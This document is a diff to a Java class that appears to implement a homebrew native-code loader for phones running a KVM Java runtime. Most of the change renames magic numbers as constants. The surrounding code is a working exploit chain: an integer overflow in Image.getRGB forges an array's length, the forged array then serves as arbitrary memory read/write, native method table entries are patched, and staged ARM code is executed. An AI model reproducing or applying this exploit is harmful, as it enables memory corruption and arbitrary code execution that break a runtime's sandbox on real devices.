@@ -17,8 +17,17 @@ final class NativeSession {
     }
 
     private static final int FORGED_LENGTH = 0x40000000;
+    // Exact adjacency of the five allocations in runChain; indices are words.
+    private static final int BOOTSTRAP_PAYLOAD_WORDS = 1024;
+    private static final int DESTINATION_TARGET_LENGTH_WORD = 11;
+    private static final int VIEW_PAYLOAD_POINTER_WORD = 5;
+    private static final int VIEW_SESSION_POINTER_WORD = 6;
+    private static final int VIEW_TARGET_POINTER_WORD = 7;
+    private static final int VIEW_CANARY_POINTER_WORD = 8;
+    private static final int VIEW_CANARY_WORD = 13;
+    private static final int CANARY_FIRST = 0x13579BDF;
+    private static final int CANARY_SECOND = 0x2468ACE0;
     private int cacheSync;
-    private static final int NATIVE_MAGIC = 0x444F4F4D; // "DOOM"
 
     final int[] result;
     private final String resource;
@@ -43,18 +52,13 @@ final class NativeSession {
     final FirmwareProfile profile;
     private boolean scanOnly;
     private int launchOptions;
+    private byte[] launchArgument;
     // Timing is sampled outside the no-allocation firmware-access interval.
     long discoveryMs;
     private long discoveryStarted;
 
-    /* result[] is the loader command/return descriptor (bootstrap/loader.c).
-     * [0] magic [1] command [2] allocated image [3] status
-     * [4..10] native diagnostics [11..14] loading bounds/entry
-     * [15] binding count [16..79] error text [80] method slot to restore
-     * [94] application launch options [96..1119] 4KiB transfer
-     * [1120..] resolved firmware API.
-     * No transfer calls occur once the application starts.
-     */
+    /* NativeProtocol names the pinned loader/runtime descriptor. Its transfer
+     * area becomes the immutable launch argument after loading has finished. */
 
     /* Temporary bootstrap objects. No UI objects are allocated while forged. */
     private int[] payload;
@@ -104,6 +108,10 @@ final class NativeSession {
     }
 
     void execute(boolean checkOnly, int options) {
+        execute(checkOnly, options, "");
+    }
+
+    void execute(boolean checkOnly, int options, String argument) {
         scanOnly = checkOnly;
         launchOptions = options;
         applicationStarted = false;
@@ -112,26 +120,28 @@ final class NativeSession {
         discoveryStarted = System.currentTimeMillis();
         discoveryMs = -1;
         try {
+            // Validate/allocate before any native patching or forged heap view.
+            launchArgument = NativeLaunchArgument.encode(argument);
             checkpoint(0x10, -1);
             discoveryStarted = System.currentTimeMillis();
             error = runChain();
             if (error == 0 && !scanOnly) {
                 // Restore the forged array BEFORE any streaming or allocation.
                 // The loader clears its own method binding on final run/free.
-                target[0x3FFFFFFF] = 1;
+                target[FORGED_LENGTH - 1] = 1;
                 forged = false;
                 discoveryMs = System.currentTimeMillis() - discoveryStarted;
                 checkpoint(0x20, -1);
                 loadApplication();
-                if (result[3] != 0)
-                    error = result[3];
+                if (result[NativeProtocol.RESULT_STATUS_WORD] != 0)
+                    error = result[NativeProtocol.RESULT_STATUS_WORD];
             }
         } catch (Throwable t) {
             thrown = t;
         } finally {
             try {
-                if (queryMethod != 0 && result[84] != 0) {
-                    result[1] = 4;
+                if (queryMethod != 0 && result[NativeProtocol.RESULT_RESIDENT_LOADER_WORD] != 0) {
+                    result[NativeProtocol.RESULT_COMMAND_WORD] = NativeProtocol.COMMAND_ABORT;
                     nativeQuery(result);
                     queryMethod = 0;
                 }
@@ -175,10 +185,11 @@ final class NativeSession {
         return a | (b << 8) | (c << 16) | (d << 24);
     }
     private void loaderCall(int op) throws IOException {
-        result[1] = op;
+        result[NativeProtocol.RESULT_COMMAND_WORD] = op;
         nativeQuery(result);
-        if (result[0] != NATIVE_MAGIC || result[3] != 0)
-            throw new IOException("Loader check " + result[3]);
+        if (result[NativeProtocol.RESULT_MAGIC_WORD] != NativeProtocol.RESULT_MAGIC
+                || result[NativeProtocol.RESULT_STATUS_WORD] != 0)
+            throw new IOException("Loader check " + result[NativeProtocol.RESULT_STATUS_WORD]);
     }
     private void transfer(InputStream in, byte[] buf, int offset, int size) throws IOException {
         while (size > 0) {
@@ -199,10 +210,10 @@ final class NativeSession {
             for (int i = n; i < ((n + 3) & ~3); i++)
                 buf[i] = 0;
             for (int i = 0; i < n; i += 4)
-                result[96 + (i >> 2)] = readWordLE(buf, i);
-            result[12] = offset;
-            result[13] = n;
-            loaderCall(2);
+                result[NativeProtocol.RESULT_TRANSFER_WORD + (i >> 2)] = readWordLE(buf, i);
+            result[NativeProtocol.RESULT_TRANSFER_OFFSET_WORD] = offset;
+            result[NativeProtocol.RESULT_TRANSFER_BYTES_WORD] = n;
+            loaderCall(NativeProtocol.COMMAND_TRANSFER);
             reportLoading(n);
             offset += n;
             size -= n;
@@ -216,7 +227,8 @@ final class NativeSession {
             throw new IOException("Missing native application");
         int memory, entry, relocations, stack, bindings;
         try {
-            if (resourceWord(in) != 0x30443453 || resourceWord(in) != 2)
+            if (resourceWord(in) != NativeProtocol.IMAGE_MAGIC
+                    || resourceWord(in) != NativeProtocol.IMAGE_VERSION)
                 throw new IOException("Bad native image version");
             int bytes = resourceWord(in);
             memory = resourceWord(in);
@@ -228,28 +240,31 @@ final class NativeSession {
                     bytes, memory, entry, relocations, stack, bindings);
             if (allocation == 0)
                 throw new IOException("Bad native image bounds");
-            byte[] buf = new byte[4096];
-            result[11] = allocation;
+            byte[] buf = new byte[NativeProtocol.TRANSFER_BYTES];
+            result[NativeProtocol.RESULT_ALLOCATION_BYTES_WORD] = allocation;
             checkpoint(0x21, -1);
-            loaderCall(1);
-            transferTotal = bytes + 4 * relocations + 8 * bindings;
+            loaderCall(NativeProtocol.COMMAND_ALLOCATE);
+            transferTotal = bytes + NativeProtocol.RELOCATION_BYTES * relocations
+                    + NativeProtocol.BINDING_BYTES * bindings;
             transferred = 0;
             reportedPercent = 0;
             checkpoint(0x22, 0);
             transfer(in, buf, 0, bytes);
-            transfer(in, buf, memory, 4 * relocations);
-            transfer(in, buf, memory + 4 * relocations, 8 * bindings);
+            transfer(in, buf, memory, NativeProtocol.RELOCATION_BYTES * relocations);
+            transfer(in, buf, memory + NativeProtocol.RELOCATION_BYTES * relocations,
+                    NativeProtocol.BINDING_BYTES * bindings);
             if (in.read() != -1)
                 throw new IOException("Trailing native image bytes");
         } finally {
             in.close();
         }
-        result[12] = memory;
-        result[13] = relocations;
-        result[14] = entry;
-        result[15] = bindings;
+        result[NativeProtocol.RESULT_IMAGE_BYTES_WORD] = memory;
+        result[NativeProtocol.RESULT_RELOCATION_COUNT_WORD] = relocations;
+        result[NativeProtocol.RESULT_ENTRY_OFFSET_WORD] = entry;
+        result[NativeProtocol.RESULT_BINDING_COUNT_WORD] = bindings;
         result[FirmwareApi.LAUNCH_OPTIONS_WORD] = launchOptions;
-        result[1] = 3;
+        NativeLaunchArgument.write(result, launchArgument);
+        result[NativeProtocol.RESULT_COMMAND_WORD] = NativeProtocol.COMMAND_RUN;
         checkpoint(0x23, -1);
         // Native entry restores this method slot before running the application.
         // After it returns there is no callable native binding left.
@@ -273,14 +288,15 @@ final class NativeSession {
         if (stageBytes == null || nativeBytes == null) {
             return 1;
         }
-        if ((stageBytes.length & 3) != 0 || stageBytes.length > 56 || (nativeBytes.length & 3) != 0
-                || nativeBytes.length == 0 || nativeBytes.length > 3072) {
+        if ((stageBytes.length & 3) != 0 || stageBytes.length > NativeProtocol.STAGE_MAX_BYTES
+                || (nativeBytes.length & 3) != 0 || nativeBytes.length == 0
+                || nativeBytes.length > NativeProtocol.LOADER_MAX_BYTES) {
             return 2;
         }
 
-        result[0] = 0;
-        result[1] = 0;
-        result[2] = 0;
+        result[NativeProtocol.RESULT_MAGIC_WORD] = 0;
+        result[NativeProtocol.RESULT_COMMAND_WORD] = 0;
+        result[NativeProtocol.RESULT_IMAGE_WORD] = 0;
         for (int i = 3; i < result.length; i++) {
             result[i] = 0;
         }
@@ -320,13 +336,13 @@ final class NativeSession {
          *   target[5..8]          = pointerBox[0..3]
          *   target[13..14]        = canary[0..1]
          */
-        payload = new int[1024];
+        payload = new int[BOOTSTRAP_PAYLOAD_WORDS];
         canary = new int[2];
         pointerBox = new Object[4];
         target = new int[1];
         destination = new int[8];
-        canary[0] = 0x13579BDF;
-        canary[1] = 0x2468ACE0;
+        canary[0] = CANARY_FIRST;
+        canary[1] = CANARY_SECOND;
         pointerBox[0] = payload;
         pointerBox[1] = this;
         pointerBox[2] = target;
@@ -335,7 +351,7 @@ final class NativeSession {
         if (target.length != 1) {
             return 4;
         }
-        overflowedOnePixelWrite(source, destination, 11);
+        overflowedOnePixelWrite(source, destination, DESTINATION_TARGET_LENGTH_WORD);
         if (target.length != FORGED_LENGTH) {
             return 5;
         }
@@ -343,36 +359,40 @@ final class NativeSession {
         /* From this point until restoreKvmState, target is an address-translation
          * window, not an ordinary one-element array. readWord/writeWord use
          * 32-bit index scaling to reach any aligned KVM address. */
-        if (target[13] != 0x13579BDF || target[14] != 0x2468ACE0 || canary[0] != 0x13579BDF
-                || canary[1] != 0x2468ACE0) {
+        if (target[VIEW_CANARY_WORD] != CANARY_FIRST
+                || target[VIEW_CANARY_WORD + 1] != CANARY_SECOND || canary[0] != CANARY_FIRST
+                || canary[1] != CANARY_SECOND) {
             return 6;
         }
 
         /* Prove reversible cross-object access before touching method metadata. */
         canaryOriginal = canary[0];
         canaryDirty = true;
-        target[13] = canaryOriginal + 1;
+        target[VIEW_CANARY_WORD] = canaryOriginal + 1;
         if (canary[0] != canaryOriginal + 1) {
             return 7;
         }
-        target[13] = canaryOriginal;
+        target[VIEW_CANARY_WORD] = canaryOriginal;
         canaryDirty = false;
         if (canary[0] != canaryOriginal) {
             return 8;
         }
 
-        int payloadObject = target[5];
-        int sessionObject = target[6];
-        int targetObject = target[7];
-        int canaryObject = target[8];
+        int payloadObject = target[VIEW_PAYLOAD_POINTER_WORD];
+        int sessionObject = target[VIEW_SESSION_POINTER_WORD];
+        int targetObject = target[VIEW_TARGET_POINTER_WORD];
+        int canaryObject = target[VIEW_CANARY_POINTER_WORD];
         if (payloadObject == 0 || sessionObject == 0 || targetObject == 0 || canaryObject == 0
                 || ((payloadObject | sessionObject | targetObject | canaryObject) & 3) != 0) {
             return 9;
         }
-        if (!ramRange(payloadObject, 12 + 4 * payload.length) || !ramRange(sessionObject, 4)
-                || !ramRange(targetObject, 16) || !ramRange(canaryObject, 20))
+        if (!ramRange(payloadObject,
+                    KvmLayout.ARRAY_DATA + NativeProtocol.WORD_BYTES * payload.length)
+                || !ramRange(sessionObject, NativeProtocol.WORD_BYTES)
+                || !ramRange(targetObject, KvmLayout.ARRAY_DATA + NativeProtocol.WORD_BYTES)
+                || !ramRange(canaryObject, KvmLayout.ARRAY_DATA + 2 * NativeProtocol.WORD_BYTES))
             return 9;
-        viewBase = targetObject + 12;
+        viewBase = targetObject + KvmLayout.ARRAY_DATA;
 
         // This scanner allocates nothing and calls no native service. All
         // firmware bindings are discovered while the arbitrary read view exists.
@@ -400,15 +420,17 @@ final class NativeSession {
          * with a count, and each following method record is 32 bytes.
          */
         int classObject = readWord(sessionObject);
-        if (!ramRange(classObject, 40)) {
+        if (!ramRange(classObject, KvmLayout.CLASS_BYTES)) {
             return 10;
         }
-        int methodTable = readWord(classObject + 36);
-        if (!ramRange(methodTable, 4)) {
+        int methodTable = readWord(classObject + KvmLayout.CLASS_METHOD_TABLE);
+        if (!ramRange(methodTable, KvmLayout.METHOD_TABLE_HEADER)) {
             return 10;
         }
         int methodCount = readWord(methodTable);
-        if (methodCount < 1 || methodCount > 512 || !ramRange(methodTable, 4 + 32 * methodCount)) {
+        if (methodCount < 1 || methodCount > KvmLayout.METHOD_MAX_COUNT
+                || !ramRange(methodTable,
+                        KvmLayout.METHOD_TABLE_HEADER + KvmLayout.METHOD_BYTES * methodCount)) {
             return 10;
         }
         cacheMethod = findNativeMethod(methodTable, methodCount, classObject, 0);
@@ -416,40 +438,51 @@ final class NativeSession {
         if (cacheMethod == 0 || queryMethod == 0 || cacheMethod == queryMethod) {
             return 11;
         }
-        cacheFlags = readWord(cacheMethod + 20);
-        int queryFlags = readWord(queryMethod + 20);
+        cacheFlags = readWord(cacheMethod + KvmLayout.METHOD_FLAGS);
+        int queryFlags = readWord(queryMethod + KvmLayout.METHOD_FLAGS);
         /* Preserve the raw record words before changing anything. These values
          * distinguish a flag-layout assumption from an already-bound code slot. */
-        result[7] = cacheFlags;
-        result[8] = queryFlags;
-        result[9] = readWord(cacheMethod + 4);
-        result[10] = readWord(queryMethod + 4);
-        result[11] = readWord(cacheMethod + 28);
-        result[12] = readWord(queryMethod + 28);
-        result[13] = (cacheMethod - methodTable - 4) / 32;
-        result[14] = (queryMethod - methodTable - 4) / 32;
-        result[15] = methodCount;
+        result[NativeProtocol.BOOTSTRAP_CACHE_FLAGS_WORD] = cacheFlags;
+        result[NativeProtocol.BOOTSTRAP_QUERY_FLAGS_WORD] = queryFlags;
+        result[NativeProtocol.BOOTSTRAP_CACHE_CODE_WORD] =
+                readWord(cacheMethod + KvmLayout.METHOD_CODE);
+        result[NativeProtocol.BOOTSTRAP_QUERY_CODE_WORD] =
+                readWord(queryMethod + KvmLayout.METHOD_CODE);
+        result[NativeProtocol.BOOTSTRAP_CACHE_SIGNATURE_WORD] =
+                readWord(cacheMethod + KvmLayout.METHOD_SIGNATURE);
+        result[NativeProtocol.BOOTSTRAP_QUERY_SIGNATURE_WORD] =
+                readWord(queryMethod + KvmLayout.METHOD_SIGNATURE);
+        result[NativeProtocol.BOOTSTRAP_CACHE_METHOD_INDEX_WORD] =
+                (cacheMethod - methodTable - KvmLayout.METHOD_TABLE_HEADER)
+                / KvmLayout.METHOD_BYTES;
+        result[NativeProtocol.BOOTSTRAP_QUERY_METHOD_INDEX_WORD] =
+                (queryMethod - methodTable - KvmLayout.METHOD_TABLE_HEADER)
+                / KvmLayout.METHOD_BYTES;
+        result[NativeProtocol.BOOTSTRAP_METHOD_COUNT_WORD] = methodCount;
         /* KVM adds ACC_POINTER|ACC_DOUBLE (0xC000) to void methods as internal
          * return-type metadata. Thus both private static native void records
          * have runtime flags 0xC10A, not just the class-file bits 0x10A. Keep
          * the original full words for restoration, including these extra bits. */
-        if ((cacheFlags & 0xFFFF) != 0xC10A || (queryFlags & 0xFFFF) != 0xC10A || result[9] != 0
-                || result[10] != 0) {
+        if ((cacheFlags & 0xFFFF) != KvmLayout.FLAGS_PRIVATE_STATIC_NATIVE_VOID
+                || (queryFlags & 0xFFFF) != KvmLayout.FLAGS_PRIVATE_STATIC_NATIVE_VOID
+                || result[NativeProtocol.BOOTSTRAP_CACHE_CODE_WORD] != 0
+                || result[NativeProtocol.BOOTSTRAP_QUERY_CODE_WORD] != 0) {
             return 12;
         }
 
         if (FirmwareProfiles.CARRIER_BOOTSTRAP.equals(profile.bootstrapId))
-            return installThroughCarrier(methodTable, methodCount, classObject, payloadObject + 12);
+            return installThroughCarrier(
+                    methodTable, methodCount, classObject, payloadObject + KvmLayout.ARRAY_DATA);
 
         /* Select an address that is also safe when read as KVM method flags. */
-        int payloadData = payloadObject + 12;
+        int payloadData = payloadObject + KvmLayout.ARRAY_DATA;
         int stageIndex = findStageIndex(
                 payloadData, payload.length, cacheMethod, stageBytes.length, nativeBytes.length);
         if (stageIndex < 0) {
             return 13;
         }
         int stageAddress = payloadData + (stageIndex << 2);
-        int nativeIndex = stageIndex + 16;
+        int nativeIndex = stageIndex + NativeProtocol.STAGE_LOADER_GAP_WORDS;
         if ((nativeIndex << 2) + nativeBytes.length > (payload.length << 2)) {
             return 14;
         }
@@ -474,11 +507,11 @@ final class NativeSession {
          * argument cleanup.
          */
         cachePatched = true;
-        writeWord(cacheMethod + 20, stageAddress);
-        writeWord(cacheMethod + 4, cacheSync);
+        writeWord(cacheMethod + KvmLayout.METHOD_FLAGS, stageAddress);
+        writeWord(cacheMethod + KvmLayout.METHOD_CODE, cacheSync);
         cacheMarker();
-        writeWord(cacheMethod + 4, 0);
-        writeWord(cacheMethod + 20, cacheFlags);
+        writeWord(cacheMethod + KvmLayout.METHOD_CODE, 0);
+        writeWord(cacheMethod + KvmLayout.METHOD_FLAGS, cacheFlags);
         cachePatched = false;
         cacheMethod = 0;
 
@@ -487,16 +520,17 @@ final class NativeSession {
          * as a Thumb entry. The native method's own access flags stay intact,
          * so nativeQuery still receives result[] through the normal KNI frame. */
         queryPatched = true;
-        writeWord(queryMethod + 4, stageAddress);
-        result[80] = queryMethod + 4;
-        result[82] = nativeAddress;
-        result[83] = nativeBytes.length;
+        writeWord(queryMethod + KvmLayout.METHOD_CODE, stageAddress);
+        result[NativeProtocol.RESULT_METHOD_SLOT_WORD] = queryMethod + KvmLayout.METHOD_CODE;
+        result[NativeProtocol.RESULT_LOADER_SOURCE_WORD] = nativeAddress;
+        result[NativeProtocol.RESULT_LOADER_BYTES_WORD] = nativeBytes.length;
         nativeQuery(result);
         // Keep the loader bound while loadApplication streams the image.
-        if (result[0] != NATIVE_MAGIC) {
+        if (result[NativeProtocol.RESULT_MAGIC_WORD] != NativeProtocol.RESULT_MAGIC) {
             return 16;
         }
-        if (result[3] != 0 || result[84] == 0)
+        if (result[NativeProtocol.RESULT_STATUS_WORD] != 0
+                || result[NativeProtocol.RESULT_RESIDENT_LOADER_WORD] == 0)
             return 18;
         return 0;
     }
@@ -506,7 +540,7 @@ final class NativeSession {
         int method = findCarrierMethod(table, count, owner);
         if (method == 0)
             return 120;
-        carrierCode = readWord(method + 4);
+        carrierCode = readWord(method + KvmLayout.METHOD_CODE);
         if (!copyAndBindLoader(nativeBytes, payload, 0))
             return 119;
         if (scanOnly)
@@ -523,17 +557,18 @@ final class NativeSession {
                 || readWord(carrierCode + CARRIER_CACHE) != cacheSync)
             return 121;
         queryPatched = true;
-        writeWord(queryMethod + 4, (carrierCode + CARRIER_ENTRY) | 1);
-        result[80] = queryMethod + 4;
-        result[82] = payloadData;
-        result[83] = nativeBytes.length;
+        writeWord(queryMethod + KvmLayout.METHOD_CODE, (carrierCode + CARRIER_ENTRY) | 1);
+        result[NativeProtocol.RESULT_METHOD_SLOT_WORD] = queryMethod + KvmLayout.METHOD_CODE;
+        result[NativeProtocol.RESULT_LOADER_SOURCE_WORD] = payloadData;
+        result[NativeProtocol.RESULT_LOADER_BYTES_WORD] = nativeBytes.length;
         nativeQuery(result);
         // The loader has replaced the temporary carrier binding with its own
         // OS-heap copy. Restore all Java jump offsets before any allocation.
         restoreCarrier();
-        if (result[0] != NATIVE_MAGIC)
+        if (result[NativeProtocol.RESULT_MAGIC_WORD] != NativeProtocol.RESULT_MAGIC)
             return 16;
-        if (result[3] != 0 || result[84] == 0)
+        if (result[NativeProtocol.RESULT_STATUS_WORD] != 0
+                || result[NativeProtocol.RESULT_RESIDENT_LOADER_WORD] == 0)
             return 18;
         return 0;
     }
@@ -550,11 +585,15 @@ final class NativeSession {
     private int findCarrierMethod(int table, int count, int owner) {
         int found = 0;
         for (int i = 0; i < count; i++) {
-            int method = table + 4 + i * 32;
-            int code = readWord(method + 4);
-            if (readWord(method + 24) == owner && (readWord(method + 28) >>> 16) == 1
-                    && (readWord(method + 20) & 0x108) == 8
-                    && (readWord(method + 16) & 65535) == CARRIER_BYTES
+            int method = table + KvmLayout.METHOD_TABLE_HEADER + i * KvmLayout.METHOD_BYTES;
+            int code = readWord(method + KvmLayout.METHOD_CODE);
+            if (readWord(method + KvmLayout.METHOD_OWNER) == owner
+                    && (readWord(method + KvmLayout.METHOD_SIGNATURE)
+                               >>> KvmLayout.METHOD_ARGUMENT_SHIFT)
+                            == 1
+                    && (readWord(method + KvmLayout.METHOD_FLAGS) & KvmLayout.FLAGS_NATIVE_STATIC)
+                            == KvmLayout.FLAGS_STATIC
+                    && (readWord(method + KvmLayout.METHOD_CODE_LENGTH) & 65535) == CARRIER_BYTES
                     && ramRange(code, CARRIER_BYTES + 2) && verifyCarrier(code)) {
                 if (found != 0)
                     return 0;
@@ -632,23 +671,23 @@ final class NativeSession {
             return;
         }
         if (cachePatched && cacheMethod != 0) {
-            writeWord(cacheMethod + 4, 0);
-            writeWord(cacheMethod + 20, cacheFlags);
+            writeWord(cacheMethod + KvmLayout.METHOD_CODE, 0);
+            writeWord(cacheMethod + KvmLayout.METHOD_FLAGS, cacheFlags);
             cacheMethod = 0;
             cachePatched = false;
         }
         if (queryPatched && queryMethod != 0) {
-            writeWord(queryMethod + 4, 0);
+            writeWord(queryMethod + KvmLayout.METHOD_CODE, 0);
             queryMethod = 0;
             queryPatched = false;
         }
         restoreCarrier();
         if (canaryDirty) {
-            target[13] = canaryOriginal;
+            target[VIEW_CANARY_WORD] = canaryOriginal;
             canaryDirty = false;
         }
         /* index scaling wraps to target+8, the original length field */
-        target[0x3FFFFFFF] = 1;
+        target[FORGED_LENGTH - 1] = 1;
         forged = false;
     }
 
@@ -663,11 +702,14 @@ final class NativeSession {
     private int findNativeMethod(int table, int count, int owner, int wantedArgs) {
         int found = 0;
         for (int i = 0; i < count; i++) {
-            int method = table + 4 + i * 32;
-            int flags = readWord(method + 20);
-            int args = readWord(method + 28) >>> 16;
-            if (readWord(method + 24) == owner && readWord(method + 4) == 0
-                    && (flags & 0x108) == 0x108 && args == wantedArgs) {
+            int method = table + KvmLayout.METHOD_TABLE_HEADER + i * KvmLayout.METHOD_BYTES;
+            int flags = readWord(method + KvmLayout.METHOD_FLAGS);
+            int args = readWord(method + KvmLayout.METHOD_SIGNATURE)
+                    >>> KvmLayout.METHOD_ARGUMENT_SHIFT;
+            if (readWord(method + KvmLayout.METHOD_OWNER) == owner
+                    && readWord(method + KvmLayout.METHOD_CODE) == 0
+                    && (flags & KvmLayout.FLAGS_NATIVE_STATIC) == KvmLayout.FLAGS_NATIVE_STATIC
+                    && args == wantedArgs) {
                 if (found != 0) {
                     return 0; // ambiguous: do not guess
                 }
@@ -690,9 +732,7 @@ final class NativeSession {
     }
 
     private boolean ramRange(int address, int bytes) {
-        int offset = address - profile.ramStart;
-        return (address & 3) == 0 && offset >= 0 && bytes > 0
-                && offset <= profile.ramLimit - profile.ramStart - bytes;
+        return profile.ramRange(address, bytes);
     }
 
     private void writeWord(int address, int value) {
@@ -721,11 +761,15 @@ final class NativeSession {
      */
     private static int findStageIndex(int payloadData, int payloadWords, int methodAddress,
             int stageLength, int nativeLength) {
-        for (int i = 0; ((i + 16) << 2) + nativeLength <= (payloadWords << 2); i++) {
+        for (int i = 0; ((i + NativeProtocol.STAGE_LOADER_GAP_WORDS) << 2) + nativeLength
+                <= (payloadWords << 2);
+                i++) {
             int address = payloadData + (i << 2);
-            if ((address & 0x108) == 0x108 && (address & 0x400) == 0
+            if ((address & KvmLayout.FLAGS_NATIVE_STATIC) == KvmLayout.FLAGS_NATIVE_STATIC
+                    && (address & KvmLayout.FLAGS_ABSTRACT) == 0
                     && unsignedLess(address + methodAddress, address)
-                    && stageLength <= 64 - (address & 31))
+                    && stageLength <= 2 * KvmLayout.CACHE_LINE_BYTES
+                                    - (address & (KvmLayout.CACHE_LINE_BYTES - 1)))
                 return i;
         }
         return -1;
@@ -741,7 +785,8 @@ final class NativeSession {
      * destination is exactly destination[d].</p>
      */
     private static void overflowedOnePixelWrite(Image image, int[] output, int d) {
-        image.getRGB(output, 0x40000000 + d, 0x40000001, 0x40000000, 0, 0x40000001, 1);
+        image.getRGB(output, FORGED_LENGTH + d, FORGED_LENGTH + 1, FORGED_LENGTH, 0,
+                FORGED_LENGTH + 1, 1);
     }
 
     /* ARM instructions and literals are embedded little-endian. The final byte
@@ -756,7 +801,7 @@ final class NativeSession {
         int patched = 0;
         for (int i = 0; i < bytes.length; i += 4) {
             int word = readWordLE(bytes, i);
-            if ((word & 0xFFFF0000) == FirmwareApi.PATCH_MAGIC) {
+            if ((word & NativeProtocol.LOADER_PATCH_MASK) == NativeProtocol.LOADER_PATCH_MAGIC) {
                 int id = word & 65535;
                 if (id >= FirmwareApi.COUNT || resolver.api[id] == 0)
                     return false;
@@ -765,7 +810,7 @@ final class NativeSession {
             }
             words[wordIndex + (i >> 2)] = word;
         }
-        return patched == 5;
+        return patched == NativeProtocol.LOADER_API_COUNT;
     }
 
     /**
@@ -779,13 +824,13 @@ final class NativeSession {
         int patches = 0;
         for (int i = 0; i < bytes.length; i += 4) {
             int word = readWordLE(bytes, i);
-            if (word == 0xDEAD0001) {
+            if (word == NativeProtocol.STAGE_PATCH_ENTRY) {
                 word = nativeAddress;
                 patches |= 1;
-            } else if (word == 0xDEAD0002) {
+            } else if (word == NativeProtocol.STAGE_PATCH_LENGTH) {
                 word = nativeLength;
                 patches |= 2;
-            } else if (word == 0xDEAD0003) {
+            } else if (word == NativeProtocol.STAGE_PATCH_CACHE) {
                 word = cacheSync;
                 patches |= 4;
             }
